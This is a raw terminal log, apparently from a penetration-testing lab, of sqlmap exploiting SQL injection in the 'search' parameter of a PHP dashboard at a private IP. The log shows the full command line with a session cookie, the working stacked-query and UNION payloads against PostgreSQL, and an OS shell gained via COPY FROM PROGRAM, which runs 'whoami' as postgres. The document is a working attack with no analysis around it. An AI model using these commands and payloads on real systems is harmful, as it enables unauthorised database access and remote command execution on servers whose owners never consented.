└──╼ #sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=t590igkhfc25dg6tist4uu5vuu" --os-shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:19:30 /2020-05-08/

[02:19:30] [INFO] testing connection to the target URL
[02:19:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[02:19:31] [INFO] testing if the target URL content is stable
[02:19:31] [INFO] target URL content is stable
[02:19:31] [INFO] testing if GET parameter 'search' is dynamic
[02:19:32] [INFO] GET parameter 'search' appears to be dynamic
[02:19:32] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[02:19:33] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
[02:19:33] [INFO] testing for SQL injection on GET parameter 'search'
[02:19:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:19:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:19:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:19:41] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[02:19:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[02:19:46] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[02:19:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[02:19:49] [INFO] testing 'Generic inline queries'
[02:19:49] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[02:20:01] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] y
[02:20:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:20:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:20:28] [INFO] target URL appears to be UNION injectable with 5 columns
[02:20:29] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=a';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=a' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113))||(CHR(85)||CHR(65)||CHR(86)||CHR(114)||CHR(72)||CHR(81)||CHR(66)||CHR(68)||CHR(116)||CHR(78)||CHR(113)||CHR(116)||CHR(114)||CHR(75)||CHR(114)||CHR(118)||CHR(98)||CHR(66)||CHR(72)||CHR(66)||CHR(113)||CHR(65)||CHR(69)||CHR(119)||CHR(104)||CHR(107)||CHR(88)||CHR(106)||CHR(74)||CHR(66)||CHR(74)||CHR(113)||CHR(117)||CHR(115)||CHR(76)||CHR(122)||CHR(86)||CHR(77)||CHR(88)||CHR(121))||(CHR(113)||CHR(122)||CHR(122)||CHR(120)||CHR(113))-- TrRd
---
[02:20:38] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[02:20:41] [INFO] fingerprinting the back-end DBMS operating system
[02:20:42] [INFO] the back-end DBMS operating system is Linux
[02:20:43] [INFO] testing if current user is DBA
[02:20:46] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[02:20:46] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'postgres'
os-shell> 

